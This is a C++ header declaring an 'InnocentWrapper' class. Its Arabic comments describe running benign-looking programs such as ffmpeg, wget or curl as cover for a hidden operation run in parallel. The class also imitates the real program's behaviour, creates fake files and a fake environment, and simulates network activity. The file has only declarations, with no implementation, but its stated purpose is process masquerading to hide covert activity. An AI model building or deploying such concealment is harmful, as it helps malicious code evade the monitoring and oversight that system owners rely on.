#ifndef INNOCENT_WRAPPER_H
#define INNOCENT_WRAPPER_H

#include <string>
#include <vector>
#include <memory>

/**
 * فئة لتشغيل برامج بريئة كغطاء للعمليات الخفية
 */
class InnocentWrapper {
public:
    enum ProgramType {
        FFMPEG,
        WGET,
        CURL,
        TAR,
        RSYNC,
        CUSTOM
    };
    
    InnocentWrapper(ProgramType type = FFMPEG);
    
    // تشغيل البرنامج البريء كغطاء
    bool startInnocentProcess();
    
    // إيقاف البرنامج البريء
    void stopInnocentProcess();
    
    // فحص حالة البرنامج البريء
    bool isInnocentProcessRunning();
    
    // تشغيل العملية الخفية بالتوازي
    void runHiddenOperation();
    
    // تقليد سلوك البرنامج الحقيقي
    void mimicRealBehavior();
    
private:
    ProgramType programType;
    pid_t innocentPid;
    pid_t hiddenPid;
    bool isRunning;
    
    // إعداد البرنامج البريء
    std::vector<std::string> getInnocentCommand();
    std::string getProcessName();
    void setupFakeEnvironment();
    void createFakeFiles();
    void simulateNetworkActivity();
};

#endif // INNOCENT_WRAPPER_H
